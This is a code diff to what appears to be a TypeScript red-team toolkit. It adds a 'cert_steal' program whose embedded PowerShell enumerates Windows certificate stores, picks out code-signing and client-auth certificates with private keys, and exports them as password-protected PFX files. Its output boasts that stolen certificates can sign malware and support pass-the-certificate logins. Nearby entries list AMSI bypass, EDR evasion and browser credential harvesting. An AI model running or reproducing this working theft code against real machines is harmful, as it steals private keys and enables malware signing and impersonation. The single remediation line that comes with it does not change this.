@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  cert_steal: {
+    description:
+      "Certificate store theft — enumerate and export certificates with private keys from local machine and current user certificate stores. Targets code signing certs, client auth certs, smart card certs, and CA certificates. Exported as PFX for pass-the-certificate attacks, S/MIME decryption, and code signing abuse",
+    args: "--action enum|export [--store LocalMachine|CurrentUser|both] [--exportable-only] [--output PATH] [--password PFX_PASS]",
+  },
   browser_harvest: {
     description:
       "Browser credential and data harvesting — extract saved passwords, cookies, history, bookmarks, and autofill data from Chrome, Edge, Firefox, and Brave. Uses DPAPI decryption for Chromium-based browsers and NSS library for Firefox. Supports all user profiles on the system",
@@ -13900,6 +13905,132 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function certSteal(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const store = argVal(args, "--store") || "both"
+  const exportableOnly = hasFlag(args, "--exportable-only")
+  const outputPath = argVal(args, "--output") || `${process.env.TEMP || "C:\\Windows\\Temp"}`
+  const pfxPassword = argVal(args, "--password") || "cyberstrike"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Certificate store operations...\n"]
+
+  const script = `
+$stores = @()
+if ('${store}' -eq 'both' -or '${store}' -eq 'LocalMachine') { $stores += 'LocalMachine' }
+if ('${store}' -eq 'both' -or '${store}' -eq 'CurrentUser') { $stores += 'CurrentUser' }
+
+$allCerts = @()
+
+foreach ($storeLoc in $stores) {
+    Write-Output "=== Certificate Store: $storeLoc ==="
+    $storeNames = @('My','Root','CA','TrustedPeople','TrustedPublisher','AuthRoot','WebHosting')
+
+    foreach ($sn in $storeNames) {
+        try {
+            $certStore = New-Object System.Security.Cryptography.X509Certificates.X509Store($sn, $storeLoc)
+            $certStore.Open('ReadOnly')
+
+            foreach ($cert in $certStore.Certificates) {
+                $hasPrivKey = $cert.HasPrivateKey
+                $exportable = $false
+                if ($hasPrivKey) {
+                    try {
+                        $key = $cert.PrivateKey
+                        if ($key) { $exportable = $true }
+                    } catch { $exportable = $false }
+                }
+
+                $eku = ($cert.Extensions | Where-Object { $_ -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension] })
+                $usages = if ($eku) { ($eku.EnhancedKeyUsages | ForEach-Object { $_.FriendlyName }) -join ', ' } else { 'N/A' }
+
+                $isInteresting = $hasPrivKey -or $usages -match 'Code Signing|Client Auth|Smart Card|Server Auth'
+                if (${exportableOnly ? '$exportable' : '$isInteresting'}) {
+                    $certInfo = [PSCustomObject]@{
+                        Store = "$storeLoc\\$sn"
+                        Subject = $cert.Subject
+                        Issuer = $cert.Issuer
+                        NotAfter = $cert.NotAfter
+                        HasPrivateKey = $hasPrivKey
+                        Exportable = $exportable
+                        Thumbprint = $cert.Thumbprint
+                        Usage = $usages
+                        Cert = $cert
+                    }
+                    $allCerts += $certInfo
+
+                    $marker = if ($exportable) { '[!!!]' } elseif ($hasPrivKey) { '[!]' } else { '[*]' }
+                    Write-Output "  $marker $sn/$($cert.Subject.Substring(0, [math]::Min(60, $cert.Subject.Length)))"
+                    Write-Output "      PrivKey: $hasPrivKey | Exportable: $exportable | Expires: $($cert.NotAfter)"
+                    Write-Output "      Usage: $usages"
+                    Write-Output "      Thumbprint: $($cert.Thumbprint)"
+                }
+            }
+            $certStore.Close()
+        } catch {}
+    }
+    Write-Output ""
+}
+
+Write-Output "=== Summary ==="
+$withKey = $allCerts | Where-Object { $_.HasPrivateKey }
+$exportableCerts = $allCerts | Where-Object { $_.Exportable }
+Write-Output "[*] Total interesting certs: $($allCerts.Count)"
+Write-Output "[*] With private key: $($withKey.Count)"
+Write-Output "[!] Exportable: $($exportableCerts.Count)"
+
+$codeSigning = $allCerts | Where-Object { $_.Usage -match 'Code Signing' -and $_.HasPrivateKey }
+$clientAuth = $allCerts | Where-Object { $_.Usage -match 'Client Auth' -and $_.HasPrivateKey }
+$smartCard = $allCerts | Where-Object { $_.Usage -match 'Smart Card' -and $_.HasPrivateKey }
+
+if ($codeSigning) {
+    Write-Output ""
+    Write-Output "[!!!] CODE SIGNING certificates with private keys:"
+    foreach ($c in $codeSigning) { Write-Output "    $($c.Subject)" }
+    Write-Output "[*] Can sign malware as trusted publisher!"
+}
+if ($clientAuth) {
+    Write-Output ""
+    Write-Output "[!!!] CLIENT AUTH certificates with private keys:"
+    foreach ($c in $clientAuth) { Write-Output "    $($c.Subject)" }
+    Write-Output "[*] Can authenticate to services via pass-the-certificate!"
+}
+
+if ('${action}' -eq 'export') {
+    Write-Output ""
+    Write-Output "=== Exporting Certificates ==="
+    $exported = 0
+    foreach ($ci in $exportableCerts) {
+        try {
+            $pfxBytes = $ci.Cert.Export('Pfx', '${pfxPassword}')
+            $safeName = $ci.Thumbprint.Substring(0,8)
+            $pfxPath = "${outputPath}\\cs-cert-$safeName.pfx"
+            [IO.File]::WriteAllBytes($pfxPath, $pfxBytes)
+            Write-Output "[+] Exported: $pfxPath ($($ci.Subject.Substring(0, [math]::Min(40, $ci.Subject.Length))))"
+            $exported++
+        } catch {
+            Write-Output "[-] Export failed: $($ci.Subject.Substring(0, [math]::Min(40, $ci.Subject.Length))) — $($_.Exception.Message)"
+        }
+    }
+    Write-Output "[*] Exported $exported certificates (password: ${pfxPassword})"
+}
+`
+  const r = await ps(script, timeout)
+  output.push(r.stdout)
+  if (r.stderr) output.push(`[!] ${r.stderr}`)
+  findings.push({
+    checkId: "WIN-CERT-001",
+    provider: "windows",
+    severity: r.stdout.includes("!!!") ? "critical" : "medium",
+    status: r.stdout.includes("Exported:") ? "EXECUTED" : "ENUMERATED",
+    resource: "certstore://local",
+    title: "Certificate store enumeration/export — code signing, client auth, private keys",
+    details: r.stdout.substring(0, 500),
+    remediation: "Mark private keys as non-exportable. Use HSMs for code signing certs. Monitor certificate export events (Event ID 1007).",
+  })
+
+  return { output: output.join("\n"), findings }
+}
+
 async function browserHarvest(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "all"
   const browser = argVal(args, "--browser") || "all"
@@ -20515,6 +20646,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  cert_steal: certSteal,
   browser_harvest: browserHarvest,
   reg_secrets: regSecrets,
   screenshot_grab: screenshotGrab,
